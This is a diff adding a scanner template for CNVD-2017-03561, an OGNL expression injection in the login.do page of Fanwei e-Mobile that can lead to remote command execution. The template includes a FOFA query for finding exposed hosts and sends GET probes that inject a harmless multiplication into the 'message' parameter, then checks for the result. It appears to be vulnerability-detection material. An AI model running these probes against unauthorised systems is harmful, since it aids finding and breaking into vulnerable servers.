@@ -1,0 +1,35 @@
+## id: CNVD-2017-03561
+## name: Fanwei eMobile - OGNL Injection
+## author: hack007x
+## severity: high
+## tags: cnvd,cnvd2017,emobile,ognl,fanwei,vuln
+## description: 上海泛微网络科技股份有限公司e-mobile平台login.do页面存在表达式注入漏洞。允许攻击者远程执行命令，获得服务器权限。
+## reference: https://gitee.com/cute-guy/Penetration_Testing_POC/blob/master/泛微e-mobile ognl注入.md
+## reference: https://reconshell.com/vulnerability-research-list/
+## fofa-query: app="泛微-eMobile"
+## verification: true
+
+#$ num1 = {{random_int(800000, 999999)}}
+#$ num2 = {{random_int(800000, 999999)}}
+#$ result = {{concat(,num1 * num2)}}  
+
+
+GET /login.do?message={{num1}}*{{num2}} HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: */*
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "{{num1 * num2}}"
+
+---
+
+GET /login/login.do?message={{num1}}*{{num2}} HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Accept: */*
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "{{num1 * num2}}"
